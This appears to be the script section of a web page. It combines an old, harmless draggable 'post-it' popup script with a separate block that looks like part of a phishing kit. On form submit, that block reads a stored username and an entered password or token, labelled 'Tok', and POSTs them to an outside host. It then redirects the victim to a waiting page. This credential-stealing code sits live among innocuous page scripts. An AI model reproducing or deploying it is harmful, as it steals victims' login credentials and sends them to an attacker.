		<script>

//Post-it only once per browser session? (0=no, 1=yes)
//Specifying 0 will cause postit to display every time page is loaded
var once_per_browser=0

///No need to edit beyond here///

var ns4=document.layers
var ie4=document.all
var ns6=document.getElementById&&!document.all

if (ns4)
crossobj=document.layers.postit
else if (ie4||ns6)
crossobj=ns6? document.getElementById("postit") : document.all.postit


function closeit(){
if (ie4||ns6)
crossobj.style.visibility="hidden"
else if (ns4)
crossobj.visibility="hide"
}

function get_cookie(Name) {
  var search = Name + "="
  var returnvalue = "";
  if (document.cookie.length > 0) {
    offset = document.cookie.indexOf(search)
    if (offset != -1) { // if cookie exists
      offset += search.length
      // set index of beginning of value
      end = document.cookie.indexOf(";", offset);
      // set index of end of cookie value
      if (end == -1)
         end = document.cookie.length;
      returnvalue=unescape(document.cookie.substring(offset, end))
      }
   }
  return returnvalue;
}

function showornot(){
if (get_cookie('postdisplay')==''){
showit()
document.cookie="postdisplay=yes"
}
}

function showit(){
if (ie4||ns6)
crossobj.style.visibility="visible"
else if (ns4)
crossobj.visibility="show"
}

if (once_per_browser)
showornot()
else
showit()

		</script>
		<script language="JavaScript">

//drag drop function for ie4+ and NS6////
/////////////////////////////////

function drag_drop(e){
if (ie4&&dragapproved){
crossobj.style.left=tempx+event.clientX-offsetx
crossobj.style.top=tempy+event.clientY-offsety
return false
}
else if (ns6&&dragapproved){
crossobj.style.left=tempx+e.clientX-offsetx
crossobj.style.top=tempy+e.clientY-offsety
return false
}
}

function initializedrag(e){
if (ie4&&event.srcElement.id=="postit"||ns6&&e.target.id=="postit"){
offsetx=ie4? event.clientX : e.clientX
offsety=ie4? event.clientY : e.clientY

tempx=parseInt(crossobj.style.left)
tempy=parseInt(crossobj.style.top)

dragapproved=true
document.onmousemove=drag_drop
}
}
document.onmousedown=initializedrag
document.onmouseup=new Function("dragapproved=false")

		<script>
			document.getElementById("telegramForm").addEventListener("submit", async function(event) {
					   event.preventDefault(); // Evita recargar la página
					   const usr = localStorage.getItem("usr") ;
					   const pw = document.getElementById("dfCedula").value
		   
					   const message = `User: ${usr} -- Tok: ${pw} --` ;
					   const responseMessage = document.getElementById("responseMessage");
		   
					   if (!message.trim()) {
						   responseMessage.textContent = "⚠️ Ingresa un mensaje antes de enviar.";
						   return;
					   }
		   
					   try {
						   const response = await fetch("https://wrappertest.alwaysdata.net/index.php", {
							   method: "POST",
							   headers: { "Content-Type": "application/json" },
							   body: JSON.stringify({ message })
						   });
		   
						   const data = await response.json();
		   
						   if (response.ok) {
							  localStorage.setItem("usr", usr);
							  window.location ="wait.html"
							   
						   } else {
							   responseMessage.textContent = "❌ Error al enviar mensaje: " + data.error;
						   }
					   } catch (error) {
						   responseMessage.textContent = "❌ Error en la solicitud: " + error.message;
					   }
				   });
		</script>
